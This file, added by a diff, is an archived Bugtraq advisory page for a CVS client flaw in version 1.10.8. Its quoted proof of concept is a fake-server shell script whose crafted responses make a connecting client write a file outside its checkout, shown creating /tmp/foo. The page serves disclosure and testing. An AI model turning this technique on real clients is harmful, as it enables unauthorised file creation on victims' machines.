@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid1523<p><b><span style="font-size: 18pt;">CVS Client Server-Instructed File Create Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1523/info">info</a><br><a href="http://www.securityfocus.com/bid/1523/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1523/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1523/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1523/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1523
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 28 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 28 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discussed in a message posted to Bugtraq by Tanaka Akira &lt;akr@m17n.org&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					CVS Kit CVS Server 1.10 .8<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	(From the Bugtraq message):<br/><br/>This problem can be tested yourself as follows.  Although this example<br/>runs a faked cvs server using the :ext: method, this vulnerability is<br/>available with any method (including :pserver: of course).<br/><br/>% ls -l /tmp/foo<br/>ls: /tmp/foo: No such file or directory<br/>% cat crackers-cvs-server <br/>#!/bin/sh<br/><br/>cat &lt;&lt;'End' <br/>Valid-requests Root Valid-responses valid-requests Repository Directory Max-dotdot Static-directory Sticky Checkin-prog Update-prog<br/>Entry Kopt Checkin-time Modified Is-modified UseUnchanged Unchanged Notify Questionable Case Argument Argumentx Global_option<br/>Gzip-stream wrapper-sendme-rcsOptions Set Kerberos-encrypt expand-modules ci co update diff log add remove update-patches<br/>gzip-file-contents status rdiff tag rtag import admin export history release watch-on watch-off watch-add watch-remove watchers<br/>editors init annotate noop<br/>ok<br/>Module-expansion tst<br/>ok<br/>Clear-sticky tst/<br/>/cvsroot/tst/<br/>Clear-static-directory tst/<br/>/cvsroot/tst/<br/>E cvs server: Updating tst<br/>Created /tmp/<br/>/cvsroot/tst/foo<br/>/foo/1.1///<br/>u=rw,g=rw,o=rw<br/>4<br/>abc<br/>ok<br/>End<br/>% CVS_RSH=./crackers-cvs-server cvs -f -d :ext:user@server:/cvsroot co tst<br/>cvs server: Updating tst<br/>cvs checkout: in directory /tmp:<br/>cvs checkout: cannot open CVS/Entries for reading: No such file or directory<br/>cvs checkout: cannot open CVS/Entries.Log: No such file or directory<br/>% ls -l /tmp/foo<br/>-rw-r--r--  1 akr  wheel  4 Jul 19 22:01 /tmp/foo<br/>% cat /tmp/foo<br/>abc
+	
+		<ul>
+</ul>
+</div>
